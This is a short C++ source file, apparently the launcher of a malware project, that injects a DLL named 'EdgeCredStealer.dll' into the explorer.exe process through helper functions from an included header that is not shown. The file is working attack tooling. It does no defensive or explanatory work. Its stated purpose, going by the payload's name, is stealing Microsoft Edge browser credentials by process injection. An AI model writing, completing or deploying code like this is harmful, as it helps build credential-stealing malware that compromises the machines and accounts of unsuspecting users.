#include <windows.h>
#include <stdio.h>
#include <iostream>
#include "Inject.h"

using namespace std;

int main() {
    const char* dllPath = "C:\\Users\\berna\\source\\repos\\EdgeCredStealer\\x64\\Release\\EdgeCredStealer.dll";
    const wchar_t* procName = L"explorer.exe";     

    int bufferSize = MultiByteToWideChar(CP_UTF8, 0, dllPath, -1, NULL, 0);
    wchar_t* wideDllPath = new wchar_t[bufferSize];
    MultiByteToWideChar(CP_UTF8, 0, dllPath, -1, wideDllPath, bufferSize);

    bool result = DLLinjector(getPIDbyProcName(procName), wideDllPath);

    if (result) {
        cout << "\nDLL Injected succesfully in PID: " << getPIDbyProcName(procName);
        OutputDebugStringA("DLL Injected");
    }
    else {
        cout << "DLL injection Failed";
    }

    delete[] wideDllPath;
    return 0;
}   